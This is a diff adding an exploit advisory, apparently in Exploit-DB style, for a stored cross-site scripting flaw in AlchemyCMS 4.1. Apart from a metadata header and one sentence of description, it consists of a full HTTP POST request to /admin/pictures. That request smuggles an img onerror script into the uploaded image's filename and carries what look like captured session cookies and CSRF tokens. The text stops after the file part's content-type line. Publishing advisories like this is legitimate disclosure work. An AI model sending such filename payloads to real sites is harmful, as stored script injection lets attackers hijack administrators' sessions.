@@ -1,0 +1,44 @@
+# Exploit Title: AlchemyCMS 4.1 - Cross-Site Scripting
+# Date: 2018-10-14 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://alchemy-cms.com/
+# Software Link : https://github.com/AlchemyCMS/alchemy_cms
+# Software : AlchemyCMS
+# Version : 4.1-stable
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : N/A
+
+# A Stored XSS vulnerability has been discovered in version 4.1.0 of AlchemyCMS via the /admin/pictures image field.
+ 
+# HTTP POST Request :
+
+POST /admin/pictures HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://TARGET/admin/pages/80/edit
+X-CSRF-Token: E6zZ6vohGua9Q0arzQVTUTmq/fJw48xBnkmfQeYxILYtmRAhDcxkaV5FeGyajgOtSXMs7r9xms7Wo44PEP9HTg==
+X-Requested-With: XMLHttpRequest
+Content-Length: 1574870
+Content-Type: multipart/form-data; boundary=---------------------------10875577401849011681645409128
+Cookie: _alchemy_demo_session=%2BSKdSGUIZALtIkYucZKu36eXcVTh4kSCFKjcxqLyFnd%2B5C87xtdx6%2B4Zkjy31YpXRzXI1nwu3BsIvI9v6eYio%2BOh1S3Kb1wd3YcARJTGJeK8ByX9N45trldIwmxK09FqDTMv897K3%2F%2Fe05YiJUEwz2jGkuXkiaxk37AHmjuJNtSNwLfGwAakOWN%2FKQvqAbl%2BMWV9crpeUuq66p6%2Bar1WmGmRcNDqUcfnDFfLmNa8%2BlCBNjieI5N0kpAv2xBJ30EZqoxee13TmKhvPoU4m3UehLKToa8gW5tCQQy7N3BF6ipZa5H1l16%2FxzwPEJl37F3T5%2F%2FkFr4JOxtYSiH9Nd1itpJjMBSZkGAou49SZoBq%2F23r%2BbENN81HrstL2TlaHkxeFdivOnAjBgwpst1qj570WU22FOQeKo80fWnARs23lCHAJy2RyY8dENcpagIQUgdbxqlCaEDqcUnnroZj0g8mhjG%2FdD2cLdym3usSVBmLoiVIPTcHf5T%2FavLUpF6PC0hUwgNEwgNZKzunlPl8tr17e9t9--RjgT8BiSM30kK4WY--s%2BPgcdnz62DCJTK14z5aag%3D%3D; __atuvc=3%7C42; __atuvs=5bc38ae909d900c3002
+Connection: close
+
+-----------------------------10875577401849011681645409128
+Content-Disposition: form-data; name="utf8"
+
+â
+-----------------------------10875577401849011681645409128
+Content-Disposition: form-data; name="authenticity_token"
+
+GqjmyJ8FM+6rE6IIK5Or6Znszlg8ilvkUKsYJsqT3l3Cl7GAKn8L6xoCio55o9IaxztHwOKOSsRHz5vb4LTOGA==
+-----------------------------10875577401849011681645409128
+Content-Disposition: form-data; name="picture[upload_hash]"
+
+2507832911685091350
+-----------------------------10875577401849011681645409128
+Content-Disposition: form-data; name="picture[image_file]"; filename="\"><img src=x onerror=alert(\"ismailtasdelen\")>.jpg"
+Content-Type: image/jpeg
